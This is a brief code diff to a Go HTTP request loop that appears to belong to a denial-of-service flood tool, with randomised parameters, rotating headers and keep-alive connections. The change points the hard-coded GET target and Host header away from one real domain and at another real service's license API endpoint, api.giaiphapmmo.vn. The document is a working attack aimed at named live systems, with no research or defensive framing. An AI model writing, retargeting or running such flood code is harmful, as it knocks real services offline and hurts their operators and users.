@@ -227,7 +227,7 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 
 		if data == "" {
 			//q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
-                q, err = http.NewRequest("GET", "https://xamvn.lol", nil)
+                q, err = http.NewRequest("GET", "https://api.giaiphapmmo.vn/api/client/licenses/active-v3", nil)
 
 		} else {
 			q, err = http.NewRequest("POST", url, strings.NewReader(data))
@@ -255,7 +255,7 @@ q.Header.Set("Cookie", headersUseragents[rand.Intn(len(headersUseragents))])
 		//q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
 		//q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
 		q.Header.Set("Connection", "keep-alive")
-		q.Header.Set("Host", "xamvn.lol")
+		q.Header.Set("Host", "api.giaiphapmmo.vn")
 
 		// Overwrite headers with parameters
 
